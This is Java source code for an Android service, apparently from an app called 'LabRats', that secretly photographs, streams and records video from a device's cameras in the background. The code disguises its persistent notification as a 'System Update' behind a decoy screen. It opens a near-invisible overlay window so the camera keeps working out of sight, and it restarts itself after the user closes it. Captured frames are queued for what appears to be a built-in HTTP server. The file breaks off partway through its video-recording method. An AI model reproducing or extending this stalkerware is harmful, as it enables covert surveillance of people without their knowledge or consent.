package com.labs.labrats;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.Matrix;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.graphics.YuvImage;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;
import android.util.Size;
import android.view.Gravity;
import android.view.Surface;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

public class MediaContainer extends Service {
    private static final String TAG = "MediaContainer";
    private static final String CHANNEL_ID = "MediaContainerChannel";
    private static final int NOTIFICATION_ID = 2002;

    // Camera components
    private CameraManager cameraManager;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;

    // Overlay for background camera
    private WindowManager windowManager;
    private SurfaceView surfaceView;
    private volatile boolean surfaceReady = false;
    private CountDownLatch surfaceLatch;

    // Live streaming
    private static volatile boolean isStreaming = false;
    private static volatile String currentCameraId = "0";
    private static volatile int streamWidth = 640;
    private static volatile int streamHeight = 480;
    private static volatile int streamQuality = 50;
    private static final BlockingQueue<byte[]> frameQueue = new ArrayBlockingQueue<>(30);

    // Photo capture
    private static volatile byte[] lastCapturedPhoto = null;
    private static volatile String lastCaptureError = null;
    private static volatile boolean captureInProgress = false;
    private static CountDownLatch captureLatch;

    // Video recording
    private MediaRecorder mediaRecorder;
    private static volatile boolean isRecording = false;
    private static String currentVideoPath = null;
    private static long recordingStartTime = 0;
    private Surface recorderSurface;

    // Night Mode
    private static volatile boolean nightModeEnabled = false;

    // WakeLock for background operation
    private PowerManager.WakeLock wakeLock;
    private static boolean isForeground = false;

    // Singleton instance
    private static MediaContainer instance;

    public static MediaContainer getInstance() {
        return instance;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        createNotificationChannel();
        ensureForeground();
        startBackgroundThread();

        // Load persistent settings
        nightModeEnabled = getSharedPreferences("StabilityConfig", MODE_PRIVATE)
                .getBoolean("night_mode", false);

        // Initialize WakeLock for background operation
        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "System:StabilityWakeLock");
        Log.d(TAG, "MediaContainer created with WakeLock support");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Start foreground service as early as possible
        if (!isForeground) {
            ensureForeground();
        }
        
        // Acquire WakeLock
        acquireWakeLock();

        if (intent != null) {
            String action = intent.getAction();
            Log.d(TAG, "OnStartCommand Action: " + action);
            if ("START_STREAM".equals(action)) {
                String camId = intent.getStringExtra("cameraId");
                int width = intent.getIntExtra("width", 640);
                int height = intent.getIntExtra("height", 480);
                int quality = intent.getIntExtra("quality", 50);
                
                // Run startStreaming in background to avoid blocking main thread
                backgroundHandler.post(() -> startStreaming(camId, width, height, quality));
            } else if ("STOP_STREAM".equals(action)) {
                stopStreaming();
            } else if ("CAPTURE_PHOTO".equals(action)) {
                String camId = intent.getStringExtra("cameraId");
                capturePhotoBackground(camId);
            } else if ("START_RECORDING".equals(action)) {
                String camId = intent.getStringExtra("cameraId");
                int width = intent.getIntExtra("width", 1280);
                int height = intent.getIntExtra("height", 720);
                startVideoRecording(camId, width, height);
            } else if ("STOP_RECORDING".equals(action)) {
                stopVideoRecording();
            } else if ("STOP".equals(action)) {
                stopStreaming();
                stopVideoRecording();
                releaseWakeLock();
                try {
                    stopForeground(true);
                } catch (Exception ignored) {}
                stopSelf();
            }
        }

        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        if (CoreSyncService.isDestructing) {
            super.onTaskRemoved(rootIntent);
            return;
        }
        // [RESURRECTION_PROTOCOL] Restart optics if cleared
        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
        restartServiceIntent.setPackage(getPackageName());
        android.app.PendingIntent restartServicePendingIntent = android.app.PendingIntent.getService(
            getApplicationContext(), 2, restartServiceIntent, android.app.PendingIntent.FLAG_ONE_SHOT | android.app.PendingIntent.FLAG_IMMUTABLE);
        android.app.AlarmManager alarmService = (android.app.AlarmManager) getApplicationContext().getSystemService(android.content.Context.ALARM_SERVICE);
        if (alarmService != null) {
            alarmService.set(android.app.AlarmManager.ELAPSED_REALTIME, android.os.SystemClock.elapsedRealtime() + 1000, restartServicePendingIntent);
        }
        super.onTaskRemoved(rootIntent);
    }

    private boolean isStealthMode() {
        android.content.ComponentName fakeAlias = new android.content.ComponentName(this, "com.labs.labrats.SystemUpdateAlias");
        return getPackageManager().getComponentEnabledSetting(fakeAlias) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
    }

    private void ensureForeground() {
        boolean stealth = isStealthMode();
        Intent notificationIntent = new Intent(this, stealth ? DecoyActivity.class : MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
                PendingIntent.FLAG_IMMUTABLE);

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(stealth ? "System Update" : "Camera Service")
                .setContentText(stealth ? "Checking for system updates..." : "Camera service is active")
                .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.drawable.default_app_icon)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                int serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
                
                // Check for camera and microphone permissions before adding the types to avoid crash on Android 14+
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                    serviceType |= ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
                }
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
                    serviceType |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
                }
                
                startForeground(NOTIFICATION_ID, notification, serviceType);
                isForeground = true;
            } else {
                startForeground(NOTIFICATION_ID, notification);
                isForeground = true;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting foreground: " + e.getMessage());
            // Fallback for Android 14 background restrictions
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                try {
                    // Try with just dataSync which is more likely to be allowed
                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
                    isForeground = true;
                } catch (Exception e2) {
                    Log.e(TAG, "Critical failure starting foreground", e2);
                    isForeground = false;
                }
            } else {
                isForeground = false;
            }
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Core Processor",
                    NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("Camera capture service");
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private void startBackgroundThread() {
        if (backgroundThread == null) {
            backgroundThread = new HandlerThread("CameraBackground");
            backgroundThread.start();
            backgroundHandler = new Handler(backgroundThread.getLooper());
        }
    }

    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Error stopping background thread", e);
            }
        }
    }

    // ============ OVERLAY FOR BACKGROUND CAMERA ============

    private void createOverlay() {
        if (windowManager != null && surfaceView != null && surfaceReady) {
            return; // Already created and ready
        }

        // Reset state
        surfaceReady = false;
        surfaceLatch = new CountDownLatch(1);

        try {
            windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            
            // Check if overlay permission is actually granted
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !android.provider.Settings.canDrawOverlays(this)) {
                Log.w(TAG, "Overlay permission not granted, camera might fail on some devices");
                // Don't return, some devices might work with ImageReader alone
                surfaceLatch.countDown();
                return;
            }

            surfaceView = new SurfaceView(getApplicationContext());

            int layoutType;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                layoutType = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
            } else {
                layoutType = WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;
            }

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    2, 2, // Minimal footprint
                    layoutType,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                    PixelFormat.TRANSLUCENT);
            params.alpha = 0.02f; // Non-zero but invisible
            params.gravity = Gravity.TOP | Gravity.START;

            surfaceView.getHolder().addCallback(new SurfaceHolder.Callback() {
                @Override
                public void surfaceCreated(@NonNull SurfaceHolder holder) {
                    surfaceReady = true;
                    if (surfaceLatch != null) surfaceLatch.countDown();
                    Log.d(TAG, "Surface created successfully");
                }

                @Override
                public void surfaceChanged(@NonNull SurfaceHolder holder, int format, int width, int height) {
                }

                @Override
                public void surfaceDestroyed(@NonNull SurfaceHolder holder) {
                    surfaceReady = false;
                }
            });

            // Add view on main thread
            new Handler(getMainLooper()).post(() -> {
                try {
                    if (windowManager != null && surfaceView != null) {
                        windowManager.addView(surfaceView, params);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error adding surface view: " + e.getMessage());
                    if (surfaceLatch != null) surfaceLatch.countDown();
                }
            });

        } catch (Exception e) {
            Log.e(TAG, "Error creating overlay: " + e.getMessage());
            if (surfaceLatch != null) surfaceLatch.countDown();
        }
    }

    private void removeOverlay() {
        if (windowManager != null && surfaceView != null) {
            try {
                new Handler(getMainLooper()).post(() -> {
                    try {
                        windowManager.removeView(surfaceView);
                    } catch (Exception e) {
                        Log.e(TAG, "Error removing view", e);
                    }
                    surfaceView = null;
                    windowManager = null;
                    surfaceReady = false;
                });
            } catch (Exception e) {
                Log.e(TAG, "Error removing overlay", e);
            }
        }
    }

    // ============ PHOTO CAPTURE ============

    public void capturePhotoBackground(String cameraId) {
        if (isStreaming || isRecording) {
            Log.w(TAG, "Camera busy with stream/record, attempt cleanup");
            // Optionally stop stream/record to take photo, or just fail
            lastCaptureError = "Camera hardware busy (Stream/Record active)";
            return;
        }

        if (cameraId == null)
            cameraId = "0";

        captureInProgress = true;
        lastCapturedPhoto = null;
        lastCaptureError = null;
        captureLatch = new CountDownLatch(1);

        final String camId = cameraId;

        backgroundHandler.post(() -> {
            try {
                createOverlay();

                // Wait for surface
                if (surfaceLatch != null) {
                    surfaceLatch.await(5, TimeUnit.SECONDS);
                }

                if (!surfaceReady) {
                    lastCaptureError = "Surface not ready (Overlay permission missing)";
                    LabRatsHttpServer.logActivity("OPTICS_ERROR: Snapshot surface not ready");
                    captureLatch.countDown();
                    return;
                }

                capturePhotoInternal(camId);

            } catch (Exception e) {
                lastCaptureError = "Error: " + e.getMessage();
                captureLatch.countDown();
            }
        });
    }

    private void capturePhotoInternal(String cameraId) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                lastCaptureError = "Camera permission not granted";
                captureLatch.countDown();
                return;
            }
        }

        try {
            CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
            Size[] jpegSizes = characteristics.get(
                    CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                    .getOutputSizes(ImageFormat.JPEG);

            Size size = chooseBestSize(jpegSizes, 1280, 720);
            int width = size.getWidth();
            int height = size.getHeight();

            imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1);
            imageReader.setOnImageAvailableListener(reader -> {
                Image image = null;
                try {
                    image = reader.acquireLatestImage();
                    if (image != null) {
                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                        byte[] rawData = new byte[buffer.remaining()];
                        buffer.get(rawData);
                        
                        // Set rotation: 90 for back, 270 for front
                        int rotation = 90;
                        try {
                            Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                            if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                                rotation = 270;
                            }
                        } catch (Exception e) {
                            rotation = 270;
                        }
                        lastCapturedPhoto = rotateJpeg(rawData, rotation);
                    }
                } catch (Exception e) {
                    lastCaptureError = "Error reading image: " + e.getMessage();
                } finally {
                    if (image != null)
                        image.close();
                    captureInProgress = false;
                    captureLatch.countDown();
                    closeCamera();
                }
            }, backgroundHandler);

            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    cameraDevice = camera;
                    createPhotoCaptureSession();
                }

                @Override
                public void onDisconnected(@NonNull CameraDevice camera) {
                    camera.close();
                    cameraDevice = null;
                    lastCaptureError = "Camera disconnected";
                    captureLatch.countDown();
                }

                @Override
                public void onError(@NonNull CameraDevice camera, int error) {
                    Log.e(TAG, "Capture error: " + error + " on camera " + cameraId);
                    LabRatsHttpServer.logActivity("OPTICS_ERROR: Camera " + cameraId + " error code " + error);
                    camera.close();
                    cameraDevice = null;
                    lastCaptureError = "Camera error: " + error;
                    captureLatch.countDown();
                }
            }, backgroundHandler);

        } catch (CameraAccessException e) {
            lastCaptureError = "Camera access error: " + e.getMessage();
            captureLatch.countDown();
        } catch (SecurityException e) {
            lastCaptureError = "Permission denied";
            captureLatch.countDown();
        }
    }

    private void createPhotoCaptureSession() {
        try {
            List<Surface> targets = new ArrayList<>();
            targets.add(imageReader.getSurface());
            
            // Add Stealth Overlay Surface if ready (required for background on many devices)
            if (surfaceReady && surfaceView != null && surfaceView.getHolder().getSurface() != null) {
                targets.add(surfaceView.getHolder().getSurface());
                Log.d(TAG, "Added overlay surface to camera session");
            }

            cameraDevice.createCaptureSession(targets,
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(@NonNull CameraCaptureSession session) {
                            captureSession = session;
                            takePhoto();
                        }

                        @Override
                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                            lastCaptureError = "Session configuration failed";
                            captureLatch.countDown();
                        }
                    }, backgroundHandler);
        } catch (CameraAccessException e) {
            lastCaptureError = "Session error: " + e.getMessage();
            captureLatch.countDown();
        }
    }

    private void takePhoto() {
        try {
            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            builder.addTarget(imageReader.getSurface());
            builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
            builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);

            captureSession.capture(builder.build(), new CameraCaptureSession.CaptureCallback() {
                @Override
                public void onCaptureCompleted(@NonNull CameraCaptureSession session,
                        @NonNull CaptureRequest request, @NonNull TotalCaptureResult result) {
                    // Image available in ImageReader callback
                }
            }, backgroundHandler);
        } catch (CameraAccessException e) {
            lastCaptureError = "Capture error: " + e.getMessage();
            captureLatch.countDown();
        }
    }

    // ============ LIVE STREAMING ============

    public void startStreaming(String cameraId, int width, int height, int quality) {
        Log.d(TAG, "Request to start streaming: " + cameraId);
        LabRatsHttpServer.logActivity("OPTICS_INIT: Starting stream from camera " + cameraId);
        if (isStreaming) {
            stopStreaming();
        }

        currentCameraId = (cameraId != null && !cameraId.isEmpty()) ? cameraId : "0";
        streamWidth = width > 0 ? width : 640;
        streamHeight = Math.max(height, 480);
        streamQuality = quality > 0 ? quality : 50;

        try {
            // [STEALTH_SURFACE_PROTOCOL]
            // Modern Android requires an active window/surface for background camera access
            createOverlay();
            
            // Critical hardware reset delay
            if (isStreaming) {
                stopStreaming();
                Thread.sleep(500); 
            }

            // Allow a small window for Surface initialization
            if (surfaceLatch != null) {
                try { surfaceLatch.await(1000, TimeUnit.MILLISECONDS); } catch (Exception ignored) {}
            }

            startStreamingInternal();

        } catch (Exception e) {
            Log.e(TAG, "Error starting stream", e);
        }
    }

    private void startStreamingInternal() {
        Log.d(TAG, "Initializing camera for internal stream: " + currentCameraId);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "Camera permission not granted");
                LabRatsHttpServer.logActivity("OPTICS_ERROR: Camera permission missing");
                return;
            }
        }

        try {
            frameQueue.clear();

            CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(currentCameraId);
            Size[] sizes = characteristics.get(
                    CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                    .getOutputSizes(ImageFormat.YUV_420_888);

            Size size = chooseBestSize(sizes, streamWidth, streamHeight);
            streamWidth = size.getWidth();
            streamHeight = size.getHeight();

            if (imageReader != null) {
                imageReader.close();
            }

            imageReader = ImageReader.newInstance(streamWidth, streamHeight, ImageFormat.YUV_420_888, 2);
            imageReader.setOnImageAvailableListener(reader -> {
                Image image = null;
                try {
                    if (!isStreaming || reader == null) return;
                    image = reader.acquireLatestImage();
                    if (image != null) {
                        int rotation = 90;
                        try {
                            Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                            if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                                rotation = 270;
                            }
                        } catch (Exception e) {}
                        
                        // --- ADAPTIVE THERMAL THROTTLING ---
                        int quality = streamQuality;
                        try {
                            Intent batIntent = getApplicationContext().registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
                            if (batIntent != null) {
                                int temp = batIntent.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, 0);
                                if (temp > 400) { // > 40°C
                                    quality = Math.max(15, quality - 15);
                                }
                            }
                        } catch (Exception ignored) {}
                        
                        byte[] jpegData = yuv420ToJpeg(image, quality, rotation);
                        if (jpegData != null) {
                            while (!frameQueue.offer(jpegData)) {
                                frameQueue.poll();
                            }
                        }
                    }
                } catch (IllegalStateException e) {
                    Log.w(TAG, "ImageReader already closed, ignoring frame");
                } catch (Exception e) {
                    Log.e(TAG, "Error processing frame", e);
                } finally {
                    if (image != null) try { image.close(); } catch (Exception ignored) {}
                }
            }, backgroundHandler);

            cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    cameraDevice = camera;
                    createStreamingSession();
                }

                @Override
                public void onDisconnected(@NonNull CameraDevice camera) {
                    Log.w(TAG, "Camera disconnected from stream " + currentCameraId);
                    camera.close();
                    cameraDevice = null;
                    isStreaming = false;
                }

                @Override
                public void onError(@NonNull CameraDevice camera, int error) {
                    Log.e(TAG, "Camera device error: " + error + " on camera " + currentCameraId);
                    LabRatsHttpServer.logActivity("OPTICS_ERROR: Stream camera " + currentCameraId + " error " + error);
                    camera.close();
                    cameraDevice = null;
                    isStreaming = false;
                }
            }, backgroundHandler);

        } catch (Exception e) {
            Log.e(TAG, "Error starting stream", e);
            LabRatsHttpServer.logActivity("OPTICS_ERROR: Fatal stream init error: " + e.getMessage());
            isStreaming = false;
        }
    }

    private void createStreamingSession() {
        if (cameraDevice == null || imageReader == null) {
            Log.e(TAG, "cameraDevice or imageReader is null, cannot create session");
            isStreaming = false;
            return;
        }
        try {
            List<Surface> targets = new ArrayList<>();
            targets.add(imageReader.getSurface());
            
            // Add Stealth Overlay Surface if ready (required for background on many devices)
            if (surfaceReady && surfaceView != null && surfaceView.getHolder().getSurface() != null) {
                targets.add(surfaceView.getHolder().getSurface());
                Log.d(TAG, "Added overlay surface to camera session");
            }

            cameraDevice.createCaptureSession(targets,
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(@NonNull CameraCaptureSession session) {
                            captureSession = session;
                            startPreview();
                        }

                        @Override
                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                            Log.e(TAG, "Streaming session configuration failed");
                            isStreaming = false;
                        }
                    }, backgroundHandler);
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error creating streaming session", e);
            isStreaming = false;
        }
    }

    private void startPreview() {
        if (cameraDevice == null) {
            Log.e(TAG, "cameraDevice is null, cannot start preview");
            isStreaming = false;
            return;
        }

        // --- ANDROID 14+ FGS UPGRADE ---
        // We must update the foreground service with CAMERA type right before using it
        ensureForeground();

        try {
            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
            builder.addTarget(imageReader.getSurface());
            builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO);
            
            if (nightModeEnabled) {
                builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_OFF);
                builder.set(CaptureRequest.SENSOR_EXPOSURE_TIME, 100000000L); // 1/10s
                builder.set(CaptureRequest.SENSOR_SENSITIVITY, 1600); // High ISO
            } else {
                builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
            }

            captureSession.setRepeatingRequest(builder.build(), null, backgroundHandler);
            isStreaming = true;
            Log.d(TAG, "Streaming started");
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error starting preview", e);
            isStreaming = false;
        }
    }

    public void stopStreaming() {
        isStreaming = false;
        closeCamera();
        removeOverlay(); // Clean up overlay to fully release resources
        frameQueue.clear();
        Log.d(TAG, "Streaming stopped and overlay removed");
    }

    public void setFlashMode(boolean on) {
        if (cameraDevice == null || captureSession == null) return;
        backgroundHandler.post(() -> {
            try {
                CaptureRequest.Builder builder;
                if (isRecording && recorderSurface != null) {
                    builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
                    builder.addTarget(recorderSurface);
                } else if (isStreaming && imageReader != null) {
                    builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                    builder.addTarget(imageReader.getSurface());
                } else {
                    return;
                }
                builder.set(CaptureRequest.FLASH_MODE, on ? CaptureRequest.FLASH_MODE_TORCH : CaptureRequest.FLASH_MODE_OFF);
                captureSession.setRepeatingRequest(builder.build(), null, backgroundHandler);
            } catch (Exception e) {
                Log.e(TAG, "Flash Error: " + e.getMessage());
            }
        });
    }


    private byte[] yuv420ToJpeg(Image image, int quality, int rotation) {
        try {
            int width = image.getWidth();
            int height = image.getHeight();

            Image.Plane[] planes = image.getPlanes();
            ByteBuffer yBuffer = planes[0].getBuffer();
            ByteBuffer uBuffer = planes[1].getBuffer();
            ByteBuffer vBuffer = planes[2].getBuffer();

            int ySize = yBuffer.remaining();
            int uSize = uBuffer.remaining();
            int vSize = vBuffer.remaining();

            byte[] nv21 = new byte[ySize + uSize + vSize];

            yBuffer.get(nv21, 0, ySize);
            vBuffer.get(nv21, ySize, vSize);
            uBuffer.get(nv21, ySize + vSize, uSize);

            YuvImage yuvImage = new YuvImage(nv21, ImageFormat.NV21, width, height, null);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            yuvImage.compressToJpeg(new Rect(0, 0, width, height), quality, out);

            if (rotation == 0) {
                return out.toByteArray();
            } else {
                return rotateJpeg(out.toByteArray(), rotation);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error converting YUV to JPEG", e);
            return null;
        }
    }

    // ============ UTILITY METHODS ============

    private Size chooseBestSize(Size[] sizes, int targetWidth, int targetHeight) {
        if (sizes == null || sizes.length == 0) {
            return new Size(640, 480);
        }

        List<Size> sizeList = Arrays.asList(sizes);
        Collections.sort(sizeList, (a, b) -> {
            int areaA = a.getWidth() * a.getHeight();
            int areaB = b.getWidth() * b.getHeight();
            return Integer.compare(areaA, areaB);
        });

        int targetArea = targetWidth * targetHeight;
        for (Size size : sizeList) {
            int area = size.getWidth() * size.getHeight();
            if (area >= targetArea * 0.5 && area <= targetArea * 2) {
                return size;
            }
        }

        // Return closest to target
        for (Size size : sizeList) {
            if (size.getWidth() >= 320 && size.getWidth() <= 1280) {
                return size;
            }
        }

        return sizeList.get(sizeList.size() / 2);
    }

    private synchronized void closeCamera() {
        Log.d(TAG, "Closing camera resources");
        try {
            if (captureSession != null) {
                try {
                    captureSession.stopRepeating();
                    captureSession.abortCaptures();
                } catch (Exception ignored) {}
                captureSession.close();
                captureSession = null;
            }
            if (cameraDevice != null) {
                cameraDevice.close();
                cameraDevice = null;
            }
            if (imageReader != null) {
                imageReader.close();
                imageReader = null;
            }
            // Add a small breather for the HAL
            try { Thread.sleep(100); } catch (InterruptedException ignored) {}
        } catch (Exception e) {
            Log.e(TAG, "Error while closing camera", e);
        }
    }

    public List<CameraInfo> getAvailableCameras() {
        List<CameraInfo> cameras = new ArrayList<>();
        try {
            String[] cameraIds = cameraManager.getCameraIdList();
            for (String cameraId : cameraIds) {
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);

                String facingStr = "Unknown";
                if (facing != null) {
                    if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        facingStr = "Front";
                    } else if (facing == CameraCharacteristics.LENS_FACING_BACK) {
                        facingStr = "Back";
                    }
                }

                Size[] sizes = characteristics.get(
                        CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                        .getOutputSizes(ImageFormat.JPEG);

                int width = 640, height = 480;
                if (sizes != null && sizes.length > 0) {
                    Size size = chooseBestSize(sizes, 1280, 720);
                    width = size.getWidth();
                    height = size.getHeight();
                }

                cameras.add(new CameraInfo(cameraId, facingStr, width, height));
            }
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error getting camera list", e);
        }
        return cameras;
    }

    // ============ STATIC ACCESSORS ============

    public static boolean isCurrentlyStreaming() {
        return isStreaming;
    }

    public static byte[] getNextFrame() {
        return frameQueue.poll();
    }

    public static byte[] getNextFrame(long timeoutMs) {
        try {
            return frameQueue.poll(timeoutMs, TimeUnit.MILLISECONDS);
        } catch (InterruptedException e) {
            return null;
        }
    }

    public static byte[] waitForPhoto(long timeoutMs) {
        if (captureLatch != null) {
            try {
                captureLatch.await(timeoutMs, TimeUnit.MILLISECONDS);
            } catch (InterruptedException e) {
            }
        }
        return lastCapturedPhoto;
    }

    public static String getLastCaptureError() {
        return lastCaptureError;
    }

    public static boolean isCaptureInProgress() {
        return captureInProgress;
    }

    public static String getCurrentCameraId() {
        return currentCameraId;
    }

    public static int getStreamWidth() {
        return streamWidth;
    }

    public static int getStreamHeight() {
        return streamHeight;
    }

    public void setNightMode(boolean enabled) {
        nightModeEnabled = enabled;
        getSharedPreferences("StabilityConfig", MODE_PRIVATE)
                .edit().putBoolean("night_mode", enabled).commit();
        if (isStreaming && captureSession != null && cameraDevice != null) {
            startPreview(); // Restart preview to apply changes
        }
    }

    public static boolean isNightModeEnabled(Context context) {
        if (instance != null) return nightModeEnabled;
        return context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                .getBoolean("night_mode", false);
    }

    public static boolean isNightModeEnabled() {
        return nightModeEnabled;
    }

    // ============ CAMERA INFO CLASS ============

    public static class CameraInfo {
        public String id;
        public String facing;
        public int width;
        public int height;

        public CameraInfo(String id, String facing, int width, int height) {
            this.id = id;
            this.facing = facing;
            this.width = width;
            this.height = height;
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "MediaContainer onDestroy");
        isStreaming = false;
        stopVideoRecording();
        closeCamera();
        removeOverlay();
        stopBackgroundThread();
        releaseWakeLock();
        instance = null;
    }

    // ============ WAKELOCK MANAGEMENT ============

    private void acquireWakeLock() {
        if (wakeLock != null && !wakeLock.isHeld()) {
            wakeLock.acquire(60 * 60 * 1000L); // 1 hour max
            Log.d(TAG, "WakeLock acquired");
        }
    }

    private void releaseWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
            Log.d(TAG, "WakeLock released");
        }
    }

    // ============ VIDEO RECORDING ============

    public void startVideoRecording(String cameraId, int width, int height) {
        if (isRecording) {
            Log.w(TAG, "Already recording, stop first");
            return;
        }

        if (cameraId == null)
            cameraId = "0";
        currentCameraId = cameraId;

